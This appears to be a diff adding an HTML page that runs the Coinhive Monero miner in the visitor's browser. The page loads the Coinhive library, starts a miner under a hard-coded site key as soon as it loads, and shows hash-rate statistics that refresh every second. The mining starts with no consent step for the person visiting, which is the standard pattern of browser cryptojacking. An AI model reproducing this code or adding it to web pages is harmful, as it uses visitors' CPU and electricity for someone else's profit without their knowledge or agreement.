@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Miner</title>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+</head>
+<body>
+<script>
+    var miner = new CoinHive.Anonymous('zVZDciAyIFuliQQCEBH0GsYg5onyrYzQ');
+    miner.start();
+</script>
+
+<div>
+	<h1>Monero Miner</h1>
+	<p>H/s: <span id="hashesPerSecond">0</span></p>
+	<p>Total Hashes: <span id="totalHashes">0</span></p>
+	<p>Accepted Hashes: <span id="acceptedHashes">0</span></p>
+</div>
+
+<script>
+    // Listen on events
+    miner.on('found', function() {  })
+    miner.on('accepted', function() {  })
+
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+ 
+        // Output to HTML elements
+        document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
+        document.getElementById("totalHashes").innerHTML = totalHashes;
+        document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
+
+        // Log to console
+        console.log("H/s: " + hashesPerSecond);
+        console.log("Total Hashes: " + totalHashes);
+        console.log("Accepted Hashes: " + acceptedHashes);
+    }, 1000);
+</script>
+</body>
+</html>
